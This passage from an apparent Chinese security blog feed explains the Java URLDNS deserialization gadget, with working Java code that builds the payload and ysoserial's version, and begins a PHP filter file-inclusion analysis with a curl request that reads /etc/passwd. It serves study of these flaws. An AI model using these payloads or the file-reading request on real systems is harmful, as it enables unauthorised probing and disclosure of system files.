mappings<span style="color:#f92672">=</span> s.<span style="color:#a6e22e">readInt</span>();<span style="color:#75715e">// Read number of mappings (size)</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (mappings<span style="color:#f92672">&lt;</span> 0)</span></span><span style="display:flex;"><span><span style="color:#66d9ef">throw</span><span style="color:#66d9ef">new</span> InvalidObjectException(<span style="color:#e6db74">"Illegal mappings count: "</span><span style="color:#f92672">+</span></span></span><span style="display:flex;"><span> mappings);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span><span style="color:#66d9ef">if</span> (mappings<span style="color:#f92672">></span> 0) {<span style="color:#75715e">// (if zero, use defaults)</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// Size the table using given load factor only if within</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// range of 0.25...4.0</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">float</span> lf<span style="color:#f92672">=</span> Math.<span style="color:#a6e22e">min</span>(Math.<span style="color:#a6e22e">max</span>(0.<span style="color:#a6e22e">25f</span>, loadFactor), 4.<span style="color:#a6e22e">0f</span>);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">float</span> fc<span style="color:#f92672">=</span> (<span style="color:#66d9ef">float</span>)mappings<span style="color:#f92672">/</span> lf<span style="color:#f92672">+</span> 1.<span style="color:#a6e22e">0f</span>;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> cap<span style="color:#f92672">=</span> ((fc<span style="color:#f92672">&lt;</span> DEFAULT_INITIAL_CAPACITY)<span style="color:#f92672">?</span></span></span><span style="display:flex;"><span> DEFAULT_INITIAL_CAPACITY :</span></span><span style="display:flex;"><span> (fc<span style="color:#f92672">>=</span> MAXIMUM_CAPACITY)<span style="color:#f92672">?</span></span></span><span style="display:flex;"><span> MAXIMUM_CAPACITY :</span></span><span style="display:flex;"><span> tableSizeFor((<span style="color:#66d9ef">int</span>)fc));</span></span><span style="display:flex;"><span><span style="color:#66d9ef">float</span> ft<span style="color:#f92672">=</span> (<span style="color:#66d9ef">float</span>)cap<span style="color:#f92672">*</span> lf;</span></span><span style="display:flex;"><span> threshold<span style="color:#f92672">=</span> ((cap<span style="color:#f92672">&lt;</span> MAXIMUM_CAPACITY<span style="color:#f92672">&amp;&amp;</span> ft<span style="color:#f92672">&lt;</span> MAXIMUM_CAPACITY)<span style="color:#f92672">?</span></span></span><span style="display:flex;"><span> (<span style="color:#66d9ef">int</span>)ft : Integer.<span style="color:#a6e22e">MAX_VALUE</span>);</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#75715e">// Check Map.Entry[].class since it's the nearest public type to</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// what we're actually creating.</span></span></span><span style="display:flex;"><span> SharedSecrets.<span style="color:#a6e22e">getJavaObjectInputStreamAccess</span>().<span style="color:#a6e22e">checkArray</span>(s, Map.<span style="color:#a6e22e">Entry</span><span style="color:#f92672">[]</span>.<span style="color:#a6e22e">class</span>, cap);</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@SuppressWarnings</span>({<span style="color:#e6db74">"rawtypes"</span>,<span style="color:#e6db74">"unchecked"</span>})</span></span><span style="display:flex;"><span> Node<span style="color:#f92672">&lt;</span>K,V<span style="color:#f92672">>[]</span> tab<span style="color:#f92672">=</span> (Node<span style="color:#f92672">&lt;</span>K,V<span style="color:#f92672">>[]</span>)<span style="color:#66d9ef">new</span> Node<span style="color:#f92672">[</span>cap<span style="color:#f92672">]</span>;</span></span><span style="display:flex;"><span> table<span style="color:#f92672">=</span> tab;</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#75715e">// Read the keys and values, and put the mappings in the HashMap</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i<span style="color:#f92672">=</span> 0; i<span style="color:#f92672">&lt;</span> mappings; i<span style="color:#f92672">++</span>) {</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@SuppressWarnings</span>(<span style="color:#e6db74">"unchecked"</span>)</span></span><span style="display:flex;"><span> K key<span style="color:#f92672">=</span> (K) s.<span style="color:#a6e22e">readObject</span>();</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@SuppressWarnings</span>(<span style="color:#e6db74">"unchecked"</span>)</span></span><span style="display:flex;"><span> V value<span style="color:#f92672">=</span> (V) s.<span style="color:#a6e22e">readObject</span>();</span></span><span style="display:flex;"><span> putVal(hash(key), key, value,<span style="color:#66d9ef">false</span>,<span style="color:#66d9ef">false</span>);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }</span></span></code></pre></div><p>可以知道，readObject方法会获取有多少个数据，而后进行通过for循环循环从数据流中读取对象信息，并通过putVal方法加入到HashMap中，其中键为<code>hash(key)</code>，也就是会尝试调用key对应类的hashCode方法计算hash值。</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">static</span><span style="color:#66d9ef">final</span><span style="color:#66d9ef">int</span><span style="color:#a6e22e">hash</span>(Object key) {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> h;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> (key<span style="color:#f92672">==</span><span style="color:#66d9ef">null</span>)<span style="color:#f92672">?</span> 0 : (h<span style="color:#f92672">=</span> key.<span style="color:#a6e22e">hashCode</span>())<span style="color:#f92672">^</span> (h<span style="color:#f92672">>>></span> 16);</span></span><span style="display:flex;"><span> }</span></span></code></pre></div><p>如果key对象为URL类，通过前面我们知道URL.hashCode方法会触发DNS请求，这也是URLDNS的原理。</p><p><em>以上代码来源于JDK 12.0.1</em></p><blockquote><p><a href="https://cloud.tencent.com/developer/article/1167574" target="_blank">https://cloud.tencent.com/developer/article/1167574</a></p><p><a href="https://anmolsehgal.medium.com/java-hashmap-internal-implementation-21597e1efec3" target="_blank">https://anmolsehgal.medium.com/java-hashmap-internal-implementation-21597e1efec3</a></p></blockquote><p><strong>实际测试</strong></p><p>使用如下代码进行测试</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span><span style="color:#66d9ef">class</span><span style="color:#a6e22e">urltest</span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span><span style="color:#66d9ef">static</span><span style="color:#66d9ef">void</span><span style="color:#a6e22e">main</span>(String<span style="color:#f92672">[]</span> args)<span style="color:#66d9ef">throws</span> IOException, ClassNotFoundException {</span></span><span style="display:flex;"><span> System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">println</span>(<span style="color:#e6db74">"hello "</span>);</span></span><span style="display:flex;"><span> URL u<span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> URL(<span style="color:#e6db74">"http://www.baidu.com/1"</span>);</span></span><span style="display:flex;"><span> URL u1<span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> URL(<span style="color:#e6db74">"http://www.aliyun.com/1"</span>);</span></span><span style="display:flex;"><span> HashMap<span style="color:#f92672">&lt;</span>URL,String<span style="color:#f92672">></span> map<span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> HashMap<span style="color:#f92672">&lt;</span>URL,String<span style="color:#f92672">></span>();</span></span><span style="display:flex;"><span> map.<span style="color:#a6e22e">put</span>(u,<span style="color:#e6db74">"1"</span>);</span></span><span style="display:flex;"><span> map.<span style="color:#a6e22e">put</span>(u1,<span style="color:#e6db74">"1"</span>);</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span> FileOutputStream fos<span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> FileOutputStream(<span style="color:#e6db74">"object"</span>);</span></span><span style="display:flex;"><span> ObjectOutputStream os<span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> ObjectOutputStream(fos);</span></span><span style="display:flex;"><span><span style="color:#75715e">//writeObject()方法将myObj对象写入object文件</span></span></span><span style="display:flex;"><span> os.<span style="color:#a6e22e">writeObject</span>(map);</span></span><span style="display:flex;"><span> os.<span style="color:#a6e22e">close</span>();</span></span><span style="display:flex;"><span><span style="color:#75715e">//从文件中反序列化obj对象</span></span></span><span style="display:flex;"><span> FileInputStream fis<span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> FileInputStream(<span style="color:#e6db74">"object"</span>);</span></span><span style="display:flex;"><span> ObjectInputStream ois<span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> ObjectInputStream(fis);</span></span><span style="display:flex;"><span><span style="color:#75715e">//恢复对象</span></span></span><span style="display:flex;"><span> HashMap map2<span style="color:#f92672">=</span> (HashMap<span style="color:#f92672">&lt;</span>URL,String<span style="color:#f92672">></span>)ois.<span style="color:#a6e22e">readObject</span>();</span></span><span style="display:flex;"><span> System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">println</span>(<span style="color:#e6db74">"finish"</span>);</span></span><span style="display:flex;"><span> ois.<span style="color:#a6e22e">close</span>();</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><p>实际测试在从文件中反序列化恢复HashMap对象时不会触发DNS查询，跟进HashMap的readObject，有如下</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i<span style="color:#f92672">=</span> 0; i<span style="color:#f92672">&lt;</span> mappings; i<span style="color:#f92672">++</span>) {</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@SuppressWarnings</span>(<span style="color:#e6db74">"unchecked"</span>)</span></span><span style="display:flex;"><span> K key<span style="color:#f92672">=</span> (K) s.<span style="color:#a6e22e">readObject</span>();</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@SuppressWarnings</span>(<span style="color:#e6db74">"unchecked"</span>)</span></span><span style="display:flex;"><span> V value<span style="color:#f92672">=</span> (V) s.<span style="color:#a6e22e">readObject</span>();</span></span><span style="display:flex;"><span> putVal(hash(key), key, value,<span style="color:#66d9ef">false</span>,<span style="color:#66d9ef">false</span>);</span></span><span style="display:flex;"><span> }</span></span></code></pre></div><p>其中对K尝试调用readObject方法反序列化出对应的对象，其会调用到URL类的readObject方法，可以看到URL的readObject方法会尝试读取到hashCode并放入对象的hashCode属性</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">private</span><span style="color:#66d9ef">synchronized</span><span style="color:#66d9ef">void</span><span style="color:#a6e22e">readObject</span>(java.<span style="color:#a6e22e">io</span>.<span style="color:#a6e22e">ObjectInputStream</span> s)</span></span><span style="display:flex;"><span><span style="color:#66d9ef">throws</span> IOException, ClassNotFoundException {</span></span><span style="display:flex;"><span> GetField gf<span style="color:#f92672">=</span> s.<span style="color:#a6e22e">readFields</span>();</span></span><span style="display:flex;"><span> String protocol<span style="color:#f92672">=</span> (String)gf.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">"protocol"</span>,<span style="color:#66d9ef">null</span>);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (getURLStreamHandler(protocol)<span style="color:#f92672">==</span><span style="color:#66d9ef">null</span>) {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">throw</span><span style="color:#66d9ef">new</span> IOException(<span style="color:#e6db74">"unknown protocol: "</span><span style="color:#f92672">+</span> protocol);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> String host<span style="color:#f92672">=</span> (String)gf.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">"host"</span>,<span style="color:#66d9ef">null</span>);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> port<span style="color:#f92672">=</span> gf.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">"port"</span>,<span style="color:#f92672">-</span>1);</span></span><span style="display:flex;"><span> String authority<span style="color:#f92672">=</span> (String)gf.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">"authority"</span>,<span style="color:#66d9ef">null</span>);</span></span><span style="display:flex;"><span> String file<span style="color:#f92672">=</span> (String)gf.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">"file"</span>,<span style="color:#66d9ef">null</span>);</span></span><span style="display:flex;"><span> String ref<span style="color:#f92672">=</span> (String)gf.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">"ref"</span>,<span style="color:#66d9ef">null</span>);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> hashCode<span style="color:#f92672">=</span> gf.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">"hashCode"</span>,<span style="color:#f92672">-</span>1);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (authority<span style="color:#f92672">==</span><span style="color:#66d9ef">null</span></span></span><span style="display:flex;"><span><span style="color:#f92672">&amp;&amp;</span> ((host<span style="color:#f92672">!=</span><span style="color:#66d9ef">null</span><span style="color:#f92672">&amp;&amp;</span><span style="color:#f92672">!</span>host.<span style="color:#a6e22e">isEmpty</span>())<span style="color:#f92672">||</span> port<span style="color:#f92672">!=</span><span style="color:#f92672">-</span>1)) {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (host<span style="color:#f92672">==</span><span style="color:#66d9ef">null</span>)</span></span><span style="display:flex;"><span> host<span style="color:#f92672">=</span><span style="color:#e6db74">""</span>;</span></span><span style="display:flex;"><span> authority<span style="color:#f92672">=</span> (port<span style="color:#f92672">==</span><span style="color:#f92672">-</span>1)<span style="color:#f92672">?</span> host : host<span style="color:#f92672">+</span><span style="color:#e6db74">":"</span><span style="color:#f92672">+</span> port;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> tempState<span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> UrlDeserializedState(protocol, host, port, authority,</span></span><span style="display:flex;"><span> file, ref, hashCode);</span></span><span style="display:flex;"><span> }</span></span></code></pre></div><p>而在序列化时，会调用HashMap.put方法，put方法会跟前面一样，调用hash方法计算hashCode，并放到对象内，序列化时hashCode就被保存了。</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> V<span style="color:#a6e22e">put</span>(K key, V value) {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> putVal(hash(key), key, value,<span style="color:#66d9ef">false</span>,<span style="color:#66d9ef">true</span>);</span></span><span style="display:flex;"><span> }</span></span></code></pre></div><p>使得在调用URL.readObject方法时能够获取到hashCode，不会进行DNS解析。要解决这个问题就得让序列化后的数据hashCode为-1才能让hashCode方法调用到getHostAddress方法。
容易想到两种办法</p><ol><li>在put后，修改数据，把hashCode对应的数据置为-1，而后进行序列化</li><li>在数据放入HashMap时，通过反射直接调用putVal并把第一个参数设为-1
以下是两种办法的实现，<a href="https://su18.org/post/ysoserial-su18-1/?#%E5%9B%9B-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-gadget-%E5%88%86%E6%9E%90" target="_blank">来源于</a></li></ol><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span><span style="color:#66d9ef">class</span><span style="color:#a6e22e">URLDNS</span> {</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span><span style="color:#66d9ef">static</span><span style="color:#66d9ef">void</span><span style="color:#a6e22e">main</span>(String<span style="color:#f92672">[]</span> args)<span style="color:#66d9ef">throws</span> Exception {</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span> HashMap<span style="color:#f92672">&lt;</span>URL, Integer<span style="color:#f92672">></span> hashMap<span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> HashMap<span style="color:#f92672">&lt;></span>();</span></span><span style="display:flex;"><span> URL url<span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> URL(<span style="color:#e6db74">"http://su18.dnslog.cn"</span>);</span></span><span style="display:flex;"><span> Field f<span style="color:#f92672">=</span> Class.<span style="color:#a6e22e">forName</span>(<span style="color:#e6db74">"java.net.URL"</span>).<span style="color:#a6e22e">getDeclaredField</span>(<span style="color:#e6db74">"hashCode"</span>);</span></span><span style="display:flex;"><span> f.<span style="color:#a6e22e">setAccessible</span>(<span style="color:#66d9ef">true</span>);</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span> f.<span style="color:#a6e22e">set</span>(url, 0x01010101);</span></span><span style="display:flex;"><span> hashMap.<span style="color:#a6e22e">put</span>(url, 0);</span></span><span style="display:flex;"><span> f.<span style="color:#a6e22e">set</span>(url,<span style="color:#f92672">-</span>1);</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span> ObjectOutputStream oos<span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> ObjectOutputStream(<span style="color:#66d9ef">new</span> FileOutputStream(<span style="color:#e6db74">"urldns.bin"</span>));</span></span><span style="display:flex;"><span> oos.<span style="color:#a6e22e">writeObject</span>(hashMap);</span></span><span style="display:flex;"><span> ObjectInputStream ois<span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> ObjectInputStream(<span style="color:#66d9ef">new</span> FileInputStream(<span style="color:#e6db74">"urldns.bin"</span>));</span></span><span style="display:flex;"><span> ois.<span style="color:#a6e22e">readObject</span>();</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span>}</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span><span style="color:#66d9ef">class</span><span style="color:#a6e22e">URLDNS2</span> {</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span><span style="color:#66d9ef">static</span><span style="color:#66d9ef">void</span><span style="color:#a6e22e">main</span>(String<span style="color:#f92672">[]</span> args)<span style="color:#66d9ef">throws</span> Exception {</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span> HashMap<span style="color:#f92672">&lt;</span>URL, Integer<span style="color:#f92672">></span> hashMap<span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> HashMap<span style="color:#f92672">&lt;></span>();</span></span><span style="display:flex;"><span> URL url<span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> URL(<span style="color:#e6db74">"http://su18.dnslog.cn"</span>);</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span> Method<span style="color:#f92672">[]</span> m<span style="color:#f92672">=</span> Class.<span style="color:#a6e22e">forName</span>(<span style="color:#e6db74">"java.util.HashMap"</span>).<span style="color:#a6e22e">getDeclaredMethods</span>();</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> (Method method : m) {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (method.<span style="color:#a6e22e">getName</span>().<span style="color:#a6e22e">equals</span>(<span style="color:#e6db74">"putVal"</span>)) {</span></span><span style="display:flex;"><span> method.<span style="color:#a6e22e">setAccessible</span>(<span style="color:#66d9ef">true</span>);</span></span><span style="display:flex;"><span> method.<span style="color:#a6e22e">invoke</span>(hashMap,<span style="color:#f92672">-</span>1, url, 0,<span style="color:#66d9ef">false</span>,<span style="color:#66d9ef">true</span>);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span> ObjectOutputStream oos<span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> ObjectOutputStream(<span style="color:#66d9ef">new</span> FileOutputStream(<span style="color:#e6db74">"urldns2.bin"</span>));</span></span><span style="display:flex;"><span> oos.<span style="color:#a6e22e">writeObject</span>(hashMap);</span></span><span style="display:flex;"><span> ObjectInputStream ois<span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> ObjectInputStream(<span style="color:#66d9ef">new</span> FileInputStream(<span style="color:#e6db74">"urldns2.bin"</span>));</span></span><span style="display:flex;"><span> ois.<span style="color:#a6e22e">readObject</span>();</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><h4 id="ysoserial-实现url-dns">ysoserial 实现URL DNS</h4><p>下载<a href="https://github.com/frohoff/ysoserial" target="_blank">源码</a>,URLDNS实现如下，很明显采用的时第一种方法，在put之后，通过反射修改对应的值。</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span><span style="color:#66d9ef">class</span><span style="color:#a6e22e">URLDNS</span><span style="color:#66d9ef">implements</span> ObjectPayload<span style="color:#f92672">&lt;</span>Object<span style="color:#f92672">></span> {</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> Object<span style="color:#a6e22e">getObject</span>(<span style="color:#66d9ef">final</span> String url)<span style="color:#66d9ef">throws</span> Exception {</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#75715e">//Avoid DNS resolution during payload creation</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//Since the field &lt;code>java.net.URL.handler&lt;/code> is transient, it will not be part of the serialized payload.</span></span></span><span style="display:flex;"><span> URLStreamHandler handler<span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> SilentURLStreamHandler();</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span> HashMap ht<span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> HashMap();<span style="color:#75715e">// HashMap that will contain the URL</span></span></span><span style="display:flex;"><span> URL u<span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> URL(<span style="color:#66d9ef">null</span>, url, handler);<span style="color:#75715e">// URL to use as the Key</span></span></span><span style="display:flex;"><span> ht.<span style="color:#a6e22e">put</span>(u, url);<span style="color:#75715e">//The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.</span></span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span> Reflections.<span style="color:#a6e22e">setFieldValue</span>(u,<span style="color:#e6db74">"hashCode"</span>,<span style="color:#f92672">-</span>1);<span style="color:#75715e">// During the put above, the URL's hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.</span></span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> ht;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span><span style="color:#66d9ef">static</span><span style="color:#66d9ef">void</span><span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">final</span> String<span style="color:#f92672">[]</span> args)<span style="color:#66d9ef">throws</span> Exception {</span></span><span style="display:flex;"><span> PayloadRunner.<span style="color:#a6e22e">run</span>(URLDNS.<span style="color:#a6e22e">class</span>, args);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#75715e">/**</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * &lt;p>This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance.</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * DNS resolution is used for vulnerability detection. It is important not to probe the given URL prior</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * using the serialized object.&lt;/p></span></span></span><span style="display:flex;"><span><span style="color:#75715e"> *</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * &lt;b>Potential false negative:&lt;/b></span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * &lt;p>If the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * second resolution.&lt;/p></span></span></span><span style="display:flex;"><span><span style="color:#75715e"> */</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span><span style="color:#66d9ef">class</span><span style="color:#a6e22e">SilentURLStreamHandler</span><span style="color:#66d9ef">extends</span> URLStreamHandler {</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">protected</span> URLConnection<span style="color:#a6e22e">openConnection</span>(URL u)<span style="color:#66d9ef">throws</span> IOException {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span><span style="color:#66d9ef">null</span>;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">protected</span><span style="color:#66d9ef">synchronized</span> InetAddress<span style="color:#a6e22e">getHostAddress</span>(URL u) {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span><span style="color:#66d9ef">null</span>;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span>}</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span><span style="color:#66d9ef">static</span><span style="color:#66d9ef">void</span><span style="color:#a6e22e">setFieldValue</span>(<span style="color:#66d9ef">final</span> Object obj,<span style="color:#66d9ef">final</span> String fieldName,<span style="color:#66d9ef">final</span> Object value)<span style="color:#66d9ef">throws</span> Exception {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">final</span> Field field<span style="color:#f92672">=</span> getField(obj.<span style="color:#a6e22e">getClass</span>(), fieldName);</span></span><span style="display:flex;"><span> field.<span style="color:#a6e22e">set</span>(obj, value);</span></span><span style="display:flex;"><span> }</span></span></code></pre></div><p><strong>参考链接</strong></p><blockquote><p><a href="https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/" target="_blank">https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/</a></p><p><a href="https://su18.org/post/ysoserial-su18-1/#%E5%9B%9B-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-gadget-%E5%88%86%E6%9E%90" target="_blank">https://su18.org/post/ysoserial-su18-1/#%E5%9B%9B-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-gadget-%E5%88%86%E6%9E%90</a></p></blockquote><p><strong>Created at 2024-01-08T16:57:37+08:00</strong></p></description></item><item><title>PHP Filter RCE 分析</title><link>https://www.ch35tnut.site/zh-cn/research/web/php-filter-rce/</link><pubDate>Fri, 29 Dec 2023 18:32:43 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/research/web/php-filter-rce/</guid><description><h3 id="php-filter是什么">PHP filter是什么</h3><p>PHP filter是PHP定义的一个伪协议，用于在数据流打开时进行筛选过滤，在数据读取或者写入的时候通过过滤器对数据进行处理。PHP filter 可以使用多个过滤器进行处理。</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">php</span><span style="color:#f92672">://</span><span style="color:#a6e22e">filter</span><span style="color:#f92672">/</span><span style="color:#a6e22e">过滤器</span><span style="color:#f92672">|</span><span style="color:#a6e22e">过滤器</span><span style="color:#f92672">/</span><span style="color:#a6e22e">resource</span><span style="color:#f92672">=</span><span style="color:#a6e22e">待过滤的数据流</span></span></span></code></pre></div><p>require_once和require的参数是一个文件路径，指明要包含的文件，而PHP filter 提供了接口，使得可以通过这个接口访问到指定的文件内容，require在包含文件时，只关心文件内容，而不关心文件内容来自于何处，所以可以给require 传PHP filter参数，</p><p>如果有如下代码</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span></span></span><span style="display:flex;"><span>$file<span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">'page'</span>];</span></span><span style="display:flex;"><span><span style="color:#66d9ef">require</span>($file);</span></span></code></pre></div><p>则可以通过如下请求泄露敏感信息</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl<span style="color:#e6db74">"http://localhost/test.php?page=php://filter/convert.base64-encode/resource=/etc/passwd"</span></span></span></code></pre></div><p>PHP的base64decode函数在处理base64编码的数据时，会自动规范化：去除字符串中不合法的字符并且忽略，而后尝试解码。
但PHP filter的base64解码行为和<code>base64decode</code>行为略有不同，PHP filter的base64-decode不能处理随即插入的等号，此时可以使用UTF-7编码规避，UTF-7编码会把等号转化为其他的base64字符。</p><h4 id="通过编码前置字符">通过编码前置字符</h4><p>根据官网链接的<a href="https://www.synacktiv.com/en/publications/php-filters-chain-what-is-it-and-how-to-use-it" target="_blank">reference</a><a href="https://www.php.net/manual/en/filters.convert.php#filters.convert.iconv" target="_blank">根据文档</a>，如果开启了iconv支持，则可以通过伪协议<code>php://convert.iconv.*.*</code>调用iconv函数。</p><blockquote><p><code>convert.iconv.&lt;input-encoding>.&lt;output-encoding></code> or<code>convert.iconv.&lt;input-encoding>/&lt;output-encoding></code></p></blockquote><p>linux中可以使用iconv函数将字符串从一个编码转为另外一个编码，在PHP://filter中可以使用iconv过滤器调用到这个函数</p><pre tabindex="0"><code>php -r "echo file_get_contents(\"php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7/res
ource=php://temp\");"
